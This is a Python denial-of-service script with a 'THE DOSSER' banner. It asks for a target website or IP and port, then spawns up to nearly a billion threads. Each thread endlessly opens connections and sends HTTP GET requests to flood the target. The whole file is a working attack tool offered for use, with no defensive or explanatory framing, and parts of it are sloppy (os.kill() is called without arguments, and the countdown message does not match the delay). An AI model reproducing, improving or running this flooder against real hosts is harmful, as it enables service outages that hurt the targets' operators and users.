import os
import requests
import time
import socket
import threading
banner = """
mmmmmmm m    m mmmmmm        mmmm    mmmm   mmmm   mmmm  mmmmmm mmmmm 
   #    #    # #             #   "m m"  "m #"   " #"   " #      #   "#
   #    #mmmm# #mmmmm        #    # #    # "#mmm  "#mmm  #mmmmm #mmmm"
   #    #    # #             #    # #    #     "#     "# #      #   "m
   #    #    # #mmmmm        #mmm"   #mm#  "mmm#" "mmm#" #mmmmm #made by ron/ladyacrossthestreet
"""
print(banner,'\n')
s = socket.socket(socket.AF_INET,   socket.SOCK_STREAM)
localhost = "127.0.0.1"
Trd = 999999999
sent = 0
def webUp():
  try:
    global HOST
    HOST = input("Host(website): ")
    os.system('clear')
    r = requests.get(HOST)
    if r.status_code == 200:
      print('\nWebsite is up\nstatus code is',r.status_code)
    else:
     print('Website state is',r.status_code)
  except Exception as e:
    print(e)
    os.kill()
def IPup():
  global HOST
  global PORT
  try:
    print('defualt port 80')
    HOST = input("Host(IP): ")
    PORT = int(input("Port: "))
    os.system('clear')
    s.connect((HOST,PORT))
    print('Host is up\n')
    s.close()
  except socket.error:
    print('Error from socket:',socket.error)
    os.kill()
def dosNet():
  global sent
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    s.sendto(("GET /" + HOST + " HTTP/1.1\r\n").encode('ascii'), (HOST, PORT))
    s.sendto(("Host: " + localhost + "\r\n\r\n").encode('ascii'), (HOST, PORT))
    sent += 1
    print('packages sent:',sent)
def dosWeb():
  global sent
  while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 80))
    s.sendto(("GET /" + HOST + " HTTP/1.1\r\n").encode('ascii'), (HOST, 80))
    s.sendto(("Host: " + localhost + "\r\n\r\n").encode('ascii'), (HOST, 80))
    sent += 1
    print('packages sent:',sent)
print('1.Website\n2.IP and PORT')
Cho = input('>')
if Cho[0] == '1':
  webUp()
  os.system('clear')
  print('starting dos in 6 seconds')
  time.sleep(5)
  for _ in range(Trd):
   thread = threading.Thread(target=dosWeb)
   thread.start()
else:
  IPup()
  os.system('clear')
  print('starting dos in 5 seconds')
  time.sleep(5)
  for _ in range(Trd):
   thread = threading.Thread(target=dosNet)
   thread.start()
